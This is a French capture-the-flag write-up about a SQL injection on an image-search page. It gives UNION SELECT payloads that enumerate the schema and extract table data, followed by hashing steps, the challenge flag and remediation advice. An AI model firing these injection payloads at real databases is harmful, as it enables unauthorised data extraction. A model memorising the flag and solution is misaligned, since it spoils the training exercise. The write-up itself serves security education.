# SQL Injection — Page Search Images

## Faille
Injection SQL via le paramètre `id` de la page de recherche d'images.

## Catégorie OWASP
A03:2021 — Injection

## Comment trouver la faille

1. La page `?page=searchimg` contient un formulaire de recherche d'images par ID.
2. Comme pour la page Members, l'input est vulnérable à l'injection SQL.
3. La différence : cette page interroge une base de données différente (`Member_images`)
   avec une table `list_images`.

## Exploitation étape par étape

### Étape 1 — Vérifier l'injection et le nombre de colonnes
```
1 UNION SELECT 1,2
```

### Étape 2 — Trouver la bonne base de données
```
1 UNION SELECT table_schema,table_name FROM information_schema.tables
```
On découvre que la table `list_images` est dans la base `Member_images`.

### Étape 3 — Extraire les données
```
1 UNION SELECT title,comment FROM Member_images.list_images
```
Résultat intéressant :
- Title : `Hack me ?`
- Comment : `If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46`

### Étape 4 — Cracker le MD5
```bash
echo -n "albatroz" | md5sum
# Résultat : 1928e8083cf461a51303633093573c46 ✓
```

### Étape 5 — Suivre les instructions
1. Déjà en minuscules : `albatroz`
2. Hasher en SHA-256 :
```bash
echo -n "albatroz" | sha256sum
# Résultat : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

## Flag
`f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

## Comment corriger

1. **Utiliser des requêtes préparées (prepared statements)** — même correction que
   pour la page Members.

2. **Valider les entrées** : l'ID devrait être strictement un entier.

3. **Séparer les bases de données** et restreindre les permissions de l'utilisateur SQL
   pour qu'il ne puisse pas faire de requêtes cross-database.

4. **Ne pas stocker d'indices de déchiffrement dans les données** de la base.
